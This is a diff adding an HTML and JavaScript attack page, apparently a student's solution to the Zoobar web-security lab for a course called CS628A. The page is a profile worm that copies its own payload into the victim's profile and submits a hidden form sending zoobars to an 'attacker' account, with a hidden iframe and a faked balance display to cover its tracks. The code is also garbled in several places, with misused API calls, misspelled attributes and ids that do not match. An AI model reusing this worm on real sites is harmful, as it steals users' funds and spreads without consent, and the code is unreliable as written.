@@ -1,0 +1,22 @@
+<script>
+	var htpReq = new XMLHttpRequest();
+	htpReq.open('GET','http://localhost:8080/answer-4.txt',false);
+	htpReq.send(null);
+
+	var prof = new XMLHttpRequest();
+	prof.setRequestHeader('POST','http://localhost:8080/zoobar/index.cgi/',true);
+	prof.send('profile_update=' + encodeURIComponent(htpReq.responseText) + '&profile_submit=save');
+
+	setTimeout(function(){var i = 11-total;document.getElementById('myField').value=i;},200);
+	setTimeout(function(){document.forms["transform1"].submit();},1500);
+	setTimeout(function(){document.getElementById("profileheader").innerHTML = document.getElementById("input")[0.value] + "'s zoobars:" + 10;document.getElementById("log")[0].visiblity = 'hidden'; },1200);
+
+</script>
+<form method="POST" name ="transferform_fake" action="http://localhost:8080/zoobar/index.cgi/transfer" targer ="dummy">
+
+<p>I lOVE CS628A! <input name="zoobars" type="hidden" value="" size=5 id ="myfield"></p>
+<p> <input name="recipient" type="hidden" value="attacker" size=10></p>
+<input name="submission" type="hidden" value="Send" size=5>
+</form>
+<iframe  id="dummy" style="width:0;height:0;border:0; border:none;"></iframe>>
+
